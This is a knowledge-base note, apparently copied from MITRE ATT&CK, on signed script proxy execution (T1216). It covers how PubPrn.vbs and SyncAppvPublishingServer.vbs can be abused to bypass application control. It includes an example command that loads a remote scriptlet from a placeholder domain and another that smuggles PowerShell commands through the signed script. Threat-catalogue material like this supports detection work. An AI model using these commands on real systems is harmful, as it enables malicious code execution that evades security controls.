Tactics: [[DEFENSE_EVASION]]
Tags: #mitre/attack/techniques/T1216  

# Signed Script Proxy Execution - T1216
---
## Description
[more on T1216](https://attack.mitre.org/techniques/T1216)

Adversaries may use scripts signed with trusted certificates to proxy execution of malicious files. Several Microsoft signed scripts that are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.[1](https://github.com/api0cradle/UltimateAppLockerByPassList)

---
## Sub-Techniques

#### PubPrn - T1216.001
[more on T1216.001](https://attack.mitre.org/techniques/T1216/001)

Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [[T1059_Command and Scripting Interpreter#Visual Basic - T1059 005|Visual Basic (T1059.005)]] script that publishes a printer to Active Directory Domain Services. The script is signed by Microsoft and is commonly executed through the [[T1059_Command and Scripting Interpreter#Windows Command Shell - T1059 003|Windows Command Shell (T1059.003)]] via `Cscript.exe`. For example, the following code publishes a printer within the specified domain: `cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com` .[1](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/pubprn)

Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.[2](https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/) To do so, adversaries may set the second `script:` parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is `pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct`. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.

In later versions of Windows (10+), `PubPrn.vbs` has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to `LDAP://`, vice the `script:` moniker which could be used to reference remote code via HTTP(S).

#### SyncAppvPublishingServer - T1216.002
[more on T1216.002](https://attack.mitre.org/techniques/T1216/002)

Adversaries may abuse SyncAppvPublishingServer.vbs to proxy execution of malicious [[T1059_Command and Scripting Interpreter#Powershell - T1059.001|PowerShell]] commands. SyncAppvPublishingServer.vbs is a Visual Basic script associated with how Windows virtualizes applications (Microsoft Application Virtualization, or App-V). [1](https://securelist.com/bluenoroff-methods-bypass-motw/108383/) For example, Windows may render Win32 applications to users as virtual applications, allowing users to launch and interact with them as if they were installed locally. [2](https://learn.microsoft.com/en-us/windows/application-management/app-v/appv-getting-started) [3](https://www.hackingarticles.in/indirect-command-execution-defense-evasion-t1202/)

The SyncAppvPublishingServer.vbs script is legitimate, may be signed by Microsoft, and is commonly executed from `\System32` through the command line via `wscript.exe`. [4](https://www.trellix.com/en-ca/about/newsroom/stories/research/suspected-darkhotel-apt-activity-update/) [5](https://lolbas-project.github.io/lolbas/Scripts/Syncappvpublishingserver/)

Adversaries may abuse SyncAppvPublishingServer.vbs to bypass  [[T1059_Command and Scripting Interpreter#Powershell - T1059.001|PowerShell]] execution restrictions and evade defensive counter measures by "living off the land." [6](https://strontic.github.io/xcyclopedia/library/SyncAppvPublishingServer.exe-3C291419F60CDF9C2E4E19AD89944FA3.html) [4](https://www.trellix.com/en-ca/about/newsroom/stories/research/suspected-darkhotel-apt-activity-update/) Proxying execution may function as a trusted/signed alternative to directly invoking `powershell.exe`. [7](https://twitter.com/monoxgas/status/895045566090010624)

For example,  [[T1059_Command and Scripting Interpreter#Powershell - T1059.001|PowerShell]]  commands may be invoked using: [5](https://lolbas-project.github.io/lolbas/Scripts/Syncappvpublishingserver/)

`SyncAppvPublishingServer.vbs "n; {PowerShell}"`
